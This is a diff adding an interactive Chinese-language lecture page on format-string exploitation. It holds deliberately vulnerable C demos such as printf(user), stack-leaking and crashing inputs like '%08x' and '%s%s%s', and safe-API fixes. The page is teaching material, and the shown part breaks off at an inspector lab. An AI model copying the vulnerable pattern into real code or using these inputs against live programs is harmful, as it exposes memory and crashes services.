+.stack-row.wrote .val{color:#ff9ba4}
+.stack-row.crash{background:rgba(255,95,109,.1);box-shadow:inset 2px 0 0 var(--red)}
+.stack-row.enter{animation:rowIn .32s ease}
+@keyframes rowIn{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:none}}
+@media(max-width:620px){
+  .stack-row{grid-template-columns:16px 1fr;grid-template-areas:"ap addr" "ap val" "ap lbl";
+    row-gap:1px;padding:8px 10px}
+  .stack-row .ap{grid-area:ap}.stack-row .addr{grid-area:addr}
+  .stack-row .val{grid-area:val}.stack-row .lbl{grid-area:lbl;text-align:left}
+}
+
+/* Sim */
+.scan-box{border:1px solid #1a232d;border-radius:8px;background:#060a0e;padding:9px 11px;margin-bottom:11px}
+.scan-box .sc-label{display:flex;justify-content:space-between;gap:8px;
+  font:8px var(--mono);letter-spacing:.1em;color:var(--ink4);margin-bottom:5px}
+.scan-line{font:11.5px/1.75 var(--mono);color:#b9c8d5;word-break:break-all;min-height:22px;white-space:pre-wrap}
+.scan-line .done{color:#4c5a67}
+.scan-line .cur{background:rgba(200,249,76,.12);color:var(--acid);border-radius:3px;
+  padding:0 2px;box-shadow:inset 0 -1px 0 var(--acid)}
+.sim-meta{display:flex;justify-content:space-between;gap:10px;margin:8px 0 4px;
+  font:8.5px var(--mono);color:var(--ink4);letter-spacing:.04em}
+.sim-meta b{color:var(--ink2);font-weight:400}
+.sim-out{min-height:112px;max-height:210px;overflow:auto;background:#05080b;border:1px solid #1a232d;
+  border-radius:8px;padding:10px 11px;font:11px/1.85 var(--mono);color:#b8c6d4;
+  white-space:pre-wrap;word-break:break-word;overflow-wrap:anywhere}
+.sim-out .bad{color:var(--red)}.sim-out .warn{color:var(--amber)}
+.sim-out .ok{color:var(--green)}.sim-out .acid{color:var(--acid)}.sim-out .dim{color:#55636f}
+
+/* Byte strip */
+.byte-scroll{overflow-x:auto;padding-bottom:4px;margin:13px 0}
+.byte-strip{display:flex;gap:3px;min-width:max-content}
+.byte{width:46px;border:1px solid #202b36;border-radius:5px;background:#060a0e;
+  padding:5px 3px 4px;text-align:center;font-family:var(--mono);transition:.25s}
+.byte .bi{display:block;font-size:7px;color:#4d5b68;letter-spacing:-.03em;white-space:nowrap;line-height:1.4}
+.byte .bv{display:block;font-size:11px;color:#c7d4df;margin-top:2px;line-height:1.4}
+.byte.foo{border-color:rgba(102,224,234,.22)}
+.byte.canary{border-color:rgba(255,95,109,.22)}
+@media(max-width:600px){
+  .byte-strip{gap:1px}
+  .byte{width:32px;padding:5px 0 4px}
+  .byte .bi{font-size:5.2px;letter-spacing:-.04em}
+  .byte .bv{font-size:9px}
+}
+.byte.foo .bi{color:rgba(102,224,234,.6)}
+.byte.canary .bi{color:rgba(255,95,109,.6)}
+.byte.changed{animation:bytePulse .5s ease}
+.byte.stomped{background:rgba(255,95,109,.1);border-color:rgba(255,95,109,.6)}
+.byte.stomped .bv{color:#ff9ba4}
+.byte.hit{box-shadow:0 0 0 2px rgba(200,249,76,.22);border-color:var(--acid)}
+@keyframes bytePulse{0%{transform:scale(.92);background:rgba(200,249,76,.14)}100%{transform:none;background:#060a0e}}
+.readout{display:grid;grid-template-columns:auto 1fr;gap:3px 12px;font:10.5px/1.8 var(--mono);
+  background:#060a0e;border:1px solid var(--line);border-radius:7px;padding:9px 11px;margin:10px 0}
+.readout .rk{color:var(--ink4)}
+.readout .rv{color:var(--ink2)}
+.readout .rv.foo{color:var(--cyan)}
+.readout .rv.can{color:#ff9ba4}
+
+/* Payload */
+.pay-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:9px;margin-bottom:10px}
+@media(max-width:760px){.pay-grid{grid-template-columns:1fr 1fr}}
+.pay-line{display:flex;align-items:flex-start;gap:9px;background:#05080b;border:1px solid #1a232d;
+  border-radius:7px;padding:10px 11px;font:10.5px/1.75 var(--mono);color:#c8d5e1;word-break:break-all;margin-top:10px}
+.pay-line .sig{color:var(--ink4);flex:none}
+.pay-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px}
+.pay-stat{background:#080c10;border:1px solid var(--line);border-radius:7px;padding:8px 10px;min-width:0}
+.pay-stat span{display:block;font:7.5px var(--mono);letter-spacing:.1em;color:var(--ink4)}
+.pay-stat b{display:block;margin-top:3px;font:11px var(--mono);color:var(--ink);font-weight:500;word-break:break-all}
+.pay-stat.wide{grid-column:1/-1}
+@media(max-width:640px){.pay-stats{grid-template-columns:1fr}}
+
+/* Endian */
+.endian-out{display:grid;gap:9px;margin-top:11px}
+.e-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.e-row .ek{font:8px var(--mono);letter-spacing:.08em;color:var(--ink4);width:82px;flex:none}
+.e-byte{font:10.5px var(--mono);color:var(--cyan);background:rgba(102,224,234,.08);
+  border:1px solid rgba(102,224,234,.2);padding:3px 6px;border-radius:4px}
+.e-dword{font:13px var(--mono);color:var(--acid);letter-spacing:.03em}
+
+/* Sled */
+.sled-wrap{border:1px solid var(--line);border-radius:10px;background:#060a0e;padding:14px;margin:16px 0}
+.sled{display:grid;grid-template-columns:repeat(24,minmax(0,1fr));gap:2px;margin-bottom:10px}
+.sled i{height:26px;border-radius:2px;background:#131a22;border:1px solid #1d2833;
+  transition:.12s;display:grid;place-items:center;font:6.5px var(--mono);color:#3d4a56}
+.sled i.sc{background:rgba(255,95,109,.12);border-color:rgba(255,95,109,.28);color:rgba(255,155,164,.7)}
+.sled i.land{background:rgba(255,200,87,.35);border-color:var(--amber);
+  box-shadow:0 0 12px rgba(255,200,87,.4);color:#1a1305}
+.sled i.sweep{background:rgba(200,249,76,.25);border-color:rgba(200,249,76,.6);color:#d9ff86}
+.sled i.exec{background:var(--red);border-color:var(--red);box-shadow:0 0 12px rgba(255,95,109,.6);color:#1a0508}
+.sled-read{font:10.5px/1.7 var(--mono);color:var(--ink3);min-height:36px}
+.sled-read b{color:var(--acid);font-weight:400}
+.sled-read .bad{color:var(--red)}
+
+/* Inspector */
+.chips{display:flex;flex-wrap:wrap;gap:6px;min-height:36px;margin:10px 0 4px}
+.tok{font:9.5px var(--mono);border:1px solid currentColor;border-radius:4px;padding:4px 7px;
+  background:rgba(255,255,255,.02)}
+.tok.leak{color:var(--cyan)}.tok.read{color:var(--amber)}.tok.write{color:var(--red)}.tok.safe{color:var(--ink3)}
+.tok-empty{font:10px var(--mono);color:var(--ink4)}
+.risk-head{display:flex;justify-content:space-between;font:8.5px var(--mono);letter-spacing:.1em;
+  color:var(--ink4);margin-top:12px}
+.risk-track{height:5px;border-radius:3px;background:#161e26;overflow:hidden;margin-top:6px}
+.risk-fill{height:100%;width:0;background:var(--acid);transition:width .4s,background .4s}
+.verdict{margin-top:11px;padding:10px 12px;border:1px solid var(--line);border-left:2px solid var(--v,var(--ink3));
+  border-radius:6px;background:#080c10;font-size:12px;line-height:1.8;color:var(--ink2)}
+.verdict strong{color:var(--v,var(--ink))}
+.verdict .vd{display:block;margin-top:4px;font-size:11px;color:var(--ink3)}
+
+/* Quiz */
+.qa-list{display:flex;flex-direction:column;gap:8px;margin:18px 0}
+.qa{border:1px solid var(--line);border-radius:10px;background:#090e14;overflow:hidden;transition:.2s}
+.qa.open{border-color:rgba(200,249,76,.22);background:#0a1016}
+.qa-q{width:100%;display:flex;align-items:flex-start;gap:11px;padding:13px 15px;border:0;
+  background:transparent;text-align:left;color:var(--ink);cursor:pointer;font:500 13.8px/1.7 var(--sans)}
+.qa-q:hover{background:rgba(255,255,255,.02)}
+.qa-q .qi{font:9.5px var(--mono);color:var(--acid);flex:none;padding-top:3px;width:22px}
+.qa-q .qt{flex:1}
+.qa-q .qm{margin-left:8px;color:var(--ink4);font:16px/1 var(--mono);
+  transition:transform .25s;flex:none;padding-top:2px}
+.qa.open .qa-q .qm{transform:rotate(45deg);color:var(--acid)}
+.qa-a{display:grid;grid-template-rows:0fr;transition:grid-template-rows .3s ease}
+.qa.open .qa-a{grid-template-rows:1fr}
+.qa-a-inner{overflow:hidden}
+.qa-a-body{margin:0 15px 0 0;padding:11px 0 15px 48px;border-top:1px dashed rgba(255,255,255,.07);
+  font-size:13px;line-height:1.8;color:var(--ink2)}
+.qa-a-body p{margin:6px 0}
+.qa-a-body pre{margin:9px 0;background:#060a0e;border:1px solid var(--line);border-radius:6px;
+  padding:9px 11px;font:10.5px/1.8 var(--mono);color:#b9c7d4;overflow-x:auto;white-space:pre}
+.qa-a-body code{font-size:.85em}
+.qa-a-body strong{color:var(--ink)}
+.qa-tag{display:inline-block;font:8px var(--mono);letter-spacing:.08em;color:var(--amber);
+  border:1px solid rgba(255,200,87,.3);padding:2px 5px;border-radius:3px;margin-right:7px;vertical-align:1px}
+.qa-tools{display:flex;gap:7px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
+.qa-count{font:9px var(--mono);color:var(--ink4);margin-left:auto}
+
+/* Recap */
+.recap{display:flex;gap:14px;align-items:flex-start;margin:26px 0 0;padding:15px 17px;
+  border:1px solid rgba(200,249,76,.14);border-radius:9px;background:rgba(200,249,76,.032)}
+.recap .rl{font:8.5px var(--mono);letter-spacing:.14em;color:var(--acid);flex:none;padding-top:3px}
+.recap p{margin:0;font-size:13px;line-height:1.8;color:var(--ink2)}
+.recap b{color:var(--ink)}
+
+/* Think */
+.think{border:1px dashed rgba(189,162,255,.3);border-radius:8px;background:rgba(189,162,255,.025);
+  padding:11px 14px;margin:16px 0}
+.think .th{font:8.5px var(--mono);letter-spacing:.14em;color:var(--violet);margin-bottom:4px}
+.think p{margin:0;font-size:12.5px;line-height:1.8;color:var(--ink2)}
+.think button{margin-top:7px;background:none;border:0;color:var(--violet);
+  font:9px var(--mono);letter-spacing:.08em;cursor:pointer;padding:0}
+.think .ta{display:none;margin-top:6px;padding-top:6px;border-top:1px dashed rgba(189,162,255,.18);
+  font-size:12px;color:var(--ink2)}
+.think.open .ta{display:block}
+
+/* Defense */
+.def-grid{display:grid;grid-template-columns:1fr 1fr;gap:11px;margin:16px 0}
+.def{position:relative;border:1px solid var(--line);border-radius:10px;background:#090e14;
+  padding:16px 16px 14px;overflow:hidden}
+.def::before{content:"";position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--c)}
+.def h4{margin:0 0 6px;font-size:14px}
+.def .df{font:8px var(--mono);letter-spacing:.1em;color:var(--c)}
+.def p{margin:6px 0;font-size:12.4px;line-height:1.75;color:var(--ink2)}
+.def .bypass{font-size:11.3px;line-height:1.7;color:var(--ink3);border-top:1px dashed var(--line);
+  margin-top:9px;padding-top:8px}
+.def .bypass b{color:var(--amber);font-weight:500}
+.def.acid{--c:var(--acid)}.def.cyan{--c:var(--cyan)}.def.amber{--c:var(--amber)}.def.red{--c:var(--red)}
+@media(max-width:780px){.def-grid{grid-template-columns:1fr}}
+
+/* Steps */
+.steps{display:flex;flex-direction:column;gap:9px;margin:18px 0}
+.step{border:1px solid var(--line);border-radius:9px;background:#090e14;padding:13px 15px}
+.step-head{display:flex;align-items:center;gap:9px;margin-bottom:7px;flex-wrap:wrap}
+.step-no{font:8.5px var(--mono);letter-spacing:.06em;color:var(--acid);
+  border:1px solid rgba(200,249,76,.25);border-radius:3px;padding:2px 5px}
+.step-title{font-size:13px;color:var(--ink);font-weight:600}
+.step p{margin:4px 0;font-size:12.3px;line-height:1.75;color:var(--ink2);max-width:none}
+.step .note{margin-top:7px}
+
+/* Footer, toast, to-top */
+.footer{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;
+  border-top:1px solid var(--line);padding:34px 0 46px;margin-top:16px;
+  font:10px/1.85 var(--mono);color:var(--ink4)}
+.footer b{color:var(--ink3);font-weight:400}
+.footer .sig{color:var(--acid)}
+.to-top{position:fixed;right:20px;bottom:20px;width:38px;height:38px;border-radius:50%;
+  border:1px solid var(--line2);background:rgba(8,12,16,.9);color:var(--ink2);cursor:pointer;
+  z-index:70;opacity:0;visibility:hidden;transition:.25s;display:grid;place-items:center;font-size:14px}
+.to-top.show{opacity:1;visibility:visible}
+.to-top:hover{color:var(--acid);border-color:var(--acid)}
+.toast{position:fixed;left:50%;bottom:26px;z-index:120;transform:translate(-50%,16px);
+  opacity:0;visibility:hidden;transition:.25s;background:var(--ink);color:#0a0b0c;
+  font:10.5px var(--mono);letter-spacing:.04em;padding:9px 15px;border-radius:7px;pointer-events:none}
+.toast.show{opacity:1;visibility:visible;transform:translate(-50%,0)}
+@media(max-width:600px){.footer{padding-bottom:70px}}
+
+/* Reveal */
+.js .reveal{opacity:0;transform:translateY(14px);
+  transition:opacity .65s cubic-bezier(.2,.7,.2,1),transform .65s cubic-bezier(.2,.7,.2,1);
+  transition-delay:var(--d,0s)}
+.js .reveal.in{opacity:1;transform:none}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  *,*::before,*::after{animation-duration:.001ms!important;animation-iteration-count:1!important;transition-duration:.001ms!important}
+  .js .reveal{opacity:1!important;transform:none!important}
+  .term-card{transform:none}
+}
+</style>
+</head>
+<body>
+<div class="readbar" id="readbar"></div>
+
+<header class="topbar">
+  <button class="menu-btn" id="menuBtn" aria-label="打开目录" aria-expanded="false"><i></i><i></i><i></i></button>
+  <a class="brand" href="#top"><span class="logo">%n</span><span>SECLAB</span><span class="slash">/</span><span>FMT-STRING</span></a>
+  <div class="top-current" id="topCurrent">00 · 先搞懂一句话</div>
+  <div class="top-right">
+    <span class="top-pct" id="topPct">0%</span>
+    <span class="top-dot"></span>
+    <span>TEACHING EDITION</span>
+  </div>
+</header>
+
+<aside class="sidebar">
+  <div class="side-head">
+    <div class="side-kicker">LECTURE 02-2 / EXPLOIT NOTES</div>
+    <div class="side-title">格式化字符串漏洞 <span>· 图解 2.0</span></div>
+  </div>
+  <nav class="toc" id="sideToc" aria-label="页面目录"></nav>
+  <div class="side-foot">
+    <div class="legend">
+      <span><i style="background:var(--cyan)"></i>读 / 泄露</span>
+      <span><i style="background:var(--amber)"></i>栈数据</span>
+      <span><i style="background:var(--red)"></i>写 / 危险</span>
+      <span><i style="background:var(--acid)"></i>修复 / 安全</span>
+    </div>
+    <div class="side-progress"><i id="sideBar"></i></div>
+    <div class="side-pct"><span>READING</span><span id="sidePct">0%</span></div>
+  </div>
+</aside>
+
+<div class="drawer" id="drawer" aria-hidden="true">
+  <div class="drawer-bg" data-close-drawer></div>
+  <aside class="drawer-panel">
+    <div class="drawer-head"><b>CONTENTS / 目录</b><button class="drawer-close" data-close-drawer aria-label="关闭目录">×</button></div>
+    <nav class="toc" id="drawerToc" aria-label="移动端页面目录"></nav>
+  </aside>
+</div>
+
+<main class="main" id="top">
+  <div class="content">
+
+    <section class="hero" aria-labelledby="heroTitle">
+      <canvas class="hero-canvas" id="hexRain" aria-hidden="true"></canvas>
+      <div class="hero-grid">
+        <div class="hero-copy">
+          <p class="kicker">SOFTWARE SECURITY <span>/</span> LECTURE 02-2 <span>/</span> EXPLOIT NOTES</p>
+          <h1 id="heroTitle">格式化字符串<em>漏洞</em></h1>
+          <p class="hero-sub">FORMAT-STRING EXPLOITATION / 从「看不懂 %n」到「能自己算 payload」</p>
+          <p class="hero-lead">printf 的第一个参数不是要打印的文字，而是一段<b>程序</b>。当这段程序来自用户输入，攻击者就拿到了读取栈、泄露内存、任意写地址的能力。</p>
+          <div class="hero-meta">
+            <span class="chip">32-BIT X86</span>
+            <span class="chip">LINUX / CDECL</span>
+            <span class="chip">GLIBC VFPRINTF</span>
+            <span class="chip">14 SECTIONS</span>
+          </div>
+          <div class="hero-actions">
+            <a class="btn" href="#s0">从头开始 <span class="ar">↓</span></a>
+            <a class="btn ghost" href="#sim">直接打开栈模拟器 <span class="ar">↘</span></a>
+          </div>
+          <div class="hero-stats">
+            <div class="hstat"><b>3</b><span>级危害升级：泄露 → 读 → 写</span></div>
+            <div class="hstat"><b>7</b><span>个可交互教具，动手验证结论</span></div>
+            <div class="hstat"><b>8</b><span>道自测题，检查迁移能力</span></div>
+          </div>
+        </div>
+
+        <div class="term-card" aria-label="终端演示">
+          <div class="term-flag">UNTRUSTED FORMAT STRING</div>
+          <div class="win-bar">
+            <span class="win-dots"><i></i><i></i><i></i></span>
+            <span class="win-file">sec-lab ~ ./log_client</span>
+            <span class="win-lang">LIVE OUTPUT</span>
+          </div>
+          <div class="term-body" role="img" aria-label="终端中，用户输入 %08x 后打印出栈地址，输入 %s%s%s 后进程段错误">
+            <div><span class="td">sec-lab:~$</span> ./log_client</div>
+            <div><span class="tc">&gt;</span> alice</div>
+            <div>[LOG] alice</div>
+            <div><span class="tc">&gt;</span> %08x.%08x.%08x.%08x</div>
+            <div>[LOG] <span class="ty">bfffebf4.0000000a.00000005.08048568</span></div>
+            <div><span class="tc">&gt;</span> %s%s%s</div>
+            <div><span class="tr">Segmentation fault (core dumped)</span></div>
+            <div><span class="td">// 代码一行没改，区别只在 user 的内容</span><span class="caret"></span></div>
+          </div>
+          <div class="term-note">printf(user) 把用户输入当成格式程序执行；这不是“显示问题”，是控制流与内存问题。</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="roadmap" aria-labelledby="roadmapTitle">
+      <div class="block-head">
+        <div>
+          <p class="kicker">ATTACK CHAIN <span>/</span> 学习路线</p>
+          <h2 id="roadmapTitle">这条攻击链，五步走完</h2>
+        </div>
+        <p>每一节先给结论，再拆原理，然后用教具验证。读完后你应该能独立完成一次读写实验。</p>
+      </div>
+      <div class="chain">
+        <div class="stage" style="--c:var(--ink3)"><span class="dot"></span><div class="si">01 / MODEL</div><h4>建立模型</h4><p>格式串是程序，参数是栈上的数据。两者混在一起，漏洞发生。</p></div>
+        <div class="stage" style="--c:var(--cyan)"><span class="dot"></span><div class="si">02 / LEAK</div><h4>泄露栈</h4><p>参数不够时，printf 顺着栈继续取，静默打印别人的数据。</p></div>
+        <div class="stage" style="--c:var(--amber)"><span class="dot"></span><div class="si">03 / READ</div><h4>任意读</h4><p>把地址塞进格式串，用 %s 或 %M$s 读取任意可读内存。</p></div>
+        <div class="stage" style="--c:var(--red)"><span class="dot"></span><div class="si">04 / WRITE</div><h4>任意写</h4><p>%n 把“已输出字符数”写入地址；宽度控制数值。</p></div>
+        <div class="stage" style="--c:var(--violet)"><span class="dot"></span><div class="si">05 / EXPLOIT</div><h4>实战与防御</h4><p>改 secret、触发二次溢出；用正确写法与缓解机制收口。</p></div>
+      </div>
+      <div class="objectives">
+        <b>学习目标</b>
+        <span><i>①</i>解释 printf(user) 为什么危险</span>
+        <span><i>②</i>手动算出 %5$n 中的数值</span>
+        <span><i>③</i>独立完成 qiang 的任意读 / 任意写</span>
+        <span><i>④</i>说清 Canary / ASLR / DEP 各自挡什么</span>
+      </div>
+    </section>
+
+    <!-- 00 -->
+    <section class="section" id="s0">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">00</div>
+        <div class="sec-eyebrow"><span class="sec-num">00</span><span class="sec-rule"></span><span class="sec-en">Mental Model</span></div>
+        <h2>先搞懂一句话</h2>
+        <p class="sec-lead">printf 的第一个参数不是「要打印的文字」，而是一段「程序」。这一节先把地基打牢，后面所有利用都从这句话长出来。</p>
+      </header>
+
+      <div class="callout tip reveal">
+        <div class="co-head"><span class="ico">!</span>One Sentence</div>
+        <p><strong><code>%</code> 是指令，不是普通字符。</strong><code>%d</code> 的意思是“去栈上取 4 个字节，当整数打印”。printf 在执行时完全不知道你传了几个参数——它只是一边读这段“程序”，一边从栈上按顺序取。</p>
+      </div>
+
+      <div class="prose">
+        <h3>0.1 先看正常情况：% 是「指令」，不是文字<span class="h3-en">NORMAL CASE</span></h3>
+        <p>先建立一个正确认知。下面这段代码里，格式串有 3 个 <code>%</code> 指令，后面正好给了 3 个参数：</p>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="demo0.c" data-lines="1">
+#include <stdio.h>
+
+int main(void){
+    int i = 5, a = 10;
+    printf("[1] Number %d has no address, number %d has: %08x\n", i, a, &a);
+    printf("[2] 折扣 100%%\n");
+    return 0;
+}</script>
+
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">demo0</span><span class="win-lang">OUTPUT</span></div>
+          <pre><span class="t-p">$</span> gcc -m32 demo0.c -o demo0 &amp;&amp; ./demo0
+[1] Number 5 has no address, number 10 has: <span class="t-warn">0xbfffebf4</span>
+[2] 折扣 <span class="t-ok">100%</span></pre>
+        </div>
+
+        <ul>
+          <li>第 <code>[1]</code> 行：格式串里有 3 个指令（<code>%d</code>、<code>%d</code>、<code>%08x</code>），后面正好 3 个参数（<code>i</code>、<code>a</code>、<code>&amp;a</code>）——一一对应，<strong>正确</strong>。</li>
+          <li>第 <code>[2]</code> 行：<code>%%</code> 不是“取参数”，而是<strong>转义</strong>，表示“我就要打印一个百分号”。这从侧面证明：<code>%</code> 在格式串里是特殊字符，不是普通文字。</li>
+        </ul>
+
+        <h3>0.2 关键问题：printf 知不知道你传了几个参数？<span class="h3-en">NO COUNT</span></h3>
+        <div class="callout danger">
+          <div class="co-head"><span class="ico">×</span>Core Fact</div>
+          <p><strong>不知道。一个字都不知道。</strong>看它的声明：<code>int printf(const char *format, ...);</code>——那个 <code>...</code> 叫<strong>可变参数</strong>。编译后的机器码里既没有参数个数，也没有参数类型，只有一串连续的 4 字节值躺在栈上。</p>
+          <p>printf 唯一的信息来源，就是 <code>format</code> 这个字符串本身。</p>
+        </div>
+
+        <p>glibc 里真正干活的是 <code>vfprintf</code>。把它简化成一个能读懂的模型，核心只有一个动作：<strong>按格式串的要求，从参数指针 <code>ap</code> 指向的位置取走 4 字节，然后把 <code>ap</code> 往后挪 4。</strong></p>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="printf-model.c" data-lines="1">
+/* 极简模型：省略宽度、精度、长度修饰等细节 */
+void my_printf(const char *fmt, ...){
+    va_list ap;
+    size_t out_count = 0;        /* 概念变量：每输出一个字符 +1 */
+    va_start(ap, fmt);           /* ap 指向 fmt 后的第 1 个参数 */
+
+    for (const char *p = fmt; *p; ) {
+        if (*p != '%') { putchar(*p++); continue; }
+
+        p++;                     /* 跳过 '%' */
+        switch (*p++) {
+        case 'd': print_int(va_arg(ap, int));              break;
+        case 'x': print_hex(va_arg(ap, unsigned));         break;
+        case 's': print_str(va_arg(ap, char *));           break;
+        case 'n': *(int *)va_arg(ap, int *) = out_count;   break;
+        }
+    }
+    va_end(ap);
+}</script>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">i</span>读法</div>
+          <p><code>va_arg(ap, 类型)</code> 就是：<strong>从 ap 现在指着的地方取走 4 个字节，然后 ap 往后挪 4。</strong>它没有任何“还剩几个参数”的检查。循环完全由格式串里的 <code>%</code> 驱动——格式串说要 5 个，它就取 5 个；你一个都没传，它也照取不误。</p>
+        </div>
+
+        <h3>0.3 用代码亲眼看一次「不匹配」<span class="h3-en">MISMATCH</span></h3>
+        <p>多给参数和少给参数，后果完全不同。先看现象：</p>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="demo1.c" data-lines="1">
+#include <stdio.h>
+
+int main(void){
+    printf("[A] %d\n", 1, 2, 3);        /* 多给了 2 个 */
+    printf("[B] %d %d %d\n", 1, 2);     /* 少给了 1 个 → 未定义行为 */
+    return 0;
+}</script>
+
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">demo1</span><span class="win-lang">OUTPUT</span></div>
+          <pre>[A] 1                    <span class="t-dim">← 多余的 2、3 被安静地忽略，无害</span>
+[B] 1 2 <span class="t-warn">134520896</span>          <span class="t-dim">← 第三个是“借”来的栈上垃圾，每次运行都可能不同</span></pre>
+        </div>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>易错点</div>
+          <p><strong>多给参数无害，少给参数才泄露。</strong>注意 <code>[B]</code>：它没有报错、没有崩溃，只是老实巴交地把栈上紧跟着的 4 个字节打印了出来。这就是<strong>信息泄露</strong>，而且是完全静默的。</p>
+          <p>严格说这属于 C 语言的<strong>未定义行为（UB）</strong>，但现实中它稳定地“读出栈上后面的内容”，所以可以被稳定利用。</p>
+        </div>
+
+        <h3>0.4 漏洞现场：格式串来自用户<span class="h3-en">THE BUG</span></h3>
+        <p>前面讨论的都是“程序员写死格式串”的情况。真正的漏洞长这样——代码把 user 当成了格式串：</p>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="demo2.c" data-lines="1">
+#include <stdio.h>
+
+void log_line(const char *user){
+    printf("[LOG] ");
+    printf(user);       /* ☠ 漏洞点：user 被当成“格式程序”执行 */
+    printf("\n");
+}
+
+int main(void){
+    log_line("alice");
+    log_line("%08x.%08x.%08x.%08x");
+    log_line("%s%s%s%s%s%s%s");
+    return 0;
+}</script>
+
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">demo2</span><span class="win-lang">OUTPUT</span></div>
+          <pre>[LOG] alice
+[LOG] <span class="t-warn">bfffebf4.0000000a.00000005.08048568</span>   <span class="t-dim">← 栈上的内存被打印出来了</span>
+[LOG] <span class="t-bad">Segmentation fault (core dumped)</span>      <span class="t-dim">← 进程挂了</span></pre>
+        </div>
+
+        <p>三行输出的差别，<strong>只在于 user 的内容</strong>——代码一行没改。这就是漏洞的本质：<strong>攻击者获得了“写 printf 指令”的权力。</strong></p>
+
+        <div class="callout fix">
+          <div class="co-head"><span class="ico">✓</span>Fix</div>
+          <p><strong>修复只有一句：格式串必须是程序员写死的常量，用户输入永远只当数据。</strong></p>
+          <pre>printf("%s", user);   <span class="tk-c">/* 现在 user 里的 '%' 只是普通字符，永远不会被当成指令 */</span></pre>
+          <p>为什么这就安全了？因为 printf 拿到的格式串是常量 <code>"%s"</code>，里面只有一条指令“取一个字符串参数并打印”，<code>user</code> 是被打印的数据，它里面的 <code>%n</code> 只是四个普通字符，不会被二次解析。</p>
+        </div>
+
+        <h3>0.5 三种危害等级<span class="h3-en">ESCALATION</span></h3>
+        <p>记住这张表，后面全是它的展开。攻击者能写什么，printf 就替他做什么：</p>
+
+        <div class="levels">
+          <div class="level leak">
+            <div class="lv">LEVEL 01 / LEAK</div>
+            <h4>信息泄露</h4>
+            <p>把栈上的值读出来打印。可能泄露地址、canary、密码、指针。</p>
+            <div class="spec">%x · %p · %d · %u · %c</div>
+          </div>
+          <div class="level read">
+            <div class="lv">LEVEL 02 / READ</div>
+            <h4>任意读 / DoS</h4>
+            <p>把栈上的值当地址，去那个地址读字符串。合法则泄密，非法则崩溃。</p>
+            <div class="spec">%s · %M$s</div>
+          </div>
+          <div class="level write">
+            <div class="lv">LEVEL 03 / WRITE</div>
+            <h4>任意写</h4>
+            <p>把“已输出字符数”写进地址。可以改变量、改返回地址，最终拿 shell。</p>
+            <div class="spec">%n · %hn · %hhn</div>
+          </div>
+        </div>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">→</span>串起来</div>
+          <p>因为 printf 不知道参数个数（0.2）→ 它会顺着栈一直往后取（0.3）→ 如果格式串由用户控制（0.4），用户就能指定“取什么、按什么方式解释”→ 于是从<strong>看</strong>到<strong>读</strong>再到<strong>写</strong>，一步步升级（0.5）。</p>
+        </div>
+
+        <h3>0.6 危险函数清单<span class="h3-en">DANGEROUS API</span></h3>
+        <p>凡是有“格式串”三个字的函数都算。关键是：<strong>用户输入有没有被放进 format 参数的位置。</strong></p>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>☠ 危险写法</th><th>✅ 安全写法</th></tr></thead>
+            <tbody>
+              <tr><td><code>printf(user)</code></td><td><code>printf("%s", user)</code></td></tr>
+              <tr><td><code>fprintf(stderr, user)</code></td><td><code>fprintf(stderr, "%s", user)</code></td></tr>
+              <tr><td><code>sprintf(buf, user)</code></td><td><code>snprintf(buf, sizeof(buf), "%s", user)</code></td></tr>
+              <tr><td><code>syslog(LOG_INFO, user)</code></td><td><code>syslog(LOG_INFO, "%s", user)</code></td></tr>
+              <tr><td><code>err(1, user)</code> / <code>warn(user)</code></td><td><code>err(1, "%s", user)</code> / <code>warn("%s", user)</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p>家族成员：<code>printf</code> / <code>fprintf</code> / <code>sprintf</code> / <code>snprintf</code> / <code>vprintf</code> / <code>vfprintf</code> / <code>vsprintf</code> / <code>vsnprintf</code> / <code>syslog</code> / <code>err</code> / <code>warn</code> / <code>errx</code> / <code>warnx</code> / <code>setproctitle</code>…</p>
+
+        <div class="callout danger">
+          <div class="co-head"><span class="ico">×</span>别踩这个坑</div>
+          <p><strong>别以为 <code>snprintf</code> 就安全。</strong>它只保证<strong>不越界写</strong>。写成 <code>snprintf(buf, n, user)</code> 的话，格式串漏洞照样成立——照样能读栈、照样能用 <code>%n</code> 写内存。<strong>“限长”和“格式”是两回事。</strong></p>
+        </div>
+
+        <h3>0.7 动手：这段输入丢进 printf(user) 会怎样？<span class="h3-en">TRY IT</span></h3>
+        <p>先别急着往下翻。输入一段内容，观察它被解析成哪些“指令”，以及风险来自哪里。</p>
+
+        <div class="lab reveal">
+          <div class="lab-head">
+            <span class="lab-title">LAB 00 / FORMAT INSPECTOR</span>
+            <span class="lab-sub">输入任意字符串，实时拆解 printf(user) 会执行的指令</span>
+            <span class="lab-live"><i></i>LIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="field-row">
+              <label class="field grow"><span>模拟用户输入</span><input id="fmtInspect" type="text" value="hello %s %n" spellcheck="false" autocomplete="off" aria-label="模拟用户输入"></label>
+            </div>
+            <div class="chips" id="inspectTokens"></div>
+            <div class="risk-head"><span>RISK LEVEL</span><span id="inspectRiskText">—</span></div>
+            <div class="risk-track"><div class="risk-fill" id="inspectRisk"></div></div>
+            <div class="verdict" id="inspectVerdict">输入内容后实时分析。</div>
+          </div>
+          <div class="lab-foot">
